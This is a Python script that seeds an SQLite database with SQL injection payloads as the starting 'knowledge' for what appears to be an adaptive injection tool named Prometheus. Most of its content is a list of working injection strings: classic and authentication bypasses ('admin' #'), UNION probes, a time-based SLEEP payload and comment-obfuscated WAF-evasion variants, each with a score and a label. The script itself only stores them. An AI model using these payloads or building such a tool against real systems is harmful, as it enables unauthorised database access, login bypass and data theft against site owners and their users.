import sqlite3
from datetime import datetime

def seed_training():
    db_path = "memory.db"
    knowledge_base = [
        ("1' OR 1=1-- ", 0.5, "WAF_BYPASS_CANDIDATE"),
        ("1' /*!50000OR*/ 1=1-- ", 0.6, "WAF_BYPASS_CANDIDATE"),
        ("1' UNION SELECT NULL,NULL-- ", 0.5, "WAF_BYPASS_CANDIDATE"),
        ("1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ", 0.7, "TIME_BASED_CANDIDATE"),
        ("1' GROUP BY 1,2,3 HAVING 1=1-- ", 0.6, "STRUCTURE_CHECK"),
        ("' OR '1'='1", 0.5, "CLASSIC_BYPASS"),
        ("1\" OR \"1\"=\"1", 0.5, "CLASSIC_BYPASS"),
        ("admin' #", 0.6, "AUTH_BYPASS"),
        ("1' OR 1=1 LIMIT 1#", 0.7, "SINGLE_ROW_BYPASS")
    ]

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS experience (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        payload TEXT UNIQUE,
                        score FLOAT,
                        status TEXT,
                        timestamp DATETIME)''')

    print("[*] Training Prometheus: Injecting initial knowledge...")
    for payload, score, status in knowledge_base:
        try:
            # Use string format for timestamp to avoid Python 3.12 deprecation warning
            now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            cursor.execute('''INSERT OR IGNORE INTO experience (payload, score, status, timestamp)
                            VALUES (?, ?, ?, ?)''', (payload, score, status, now_str))
        except Exception as e:
            print(f"[!] Error seeding {payload}: {e}")

    conn.commit()
    conn.close()
    print("[+] Training Complete. Prometheus now has 'Historical Wisdom'.")

if __name__ == "__main__":
    seed_training()
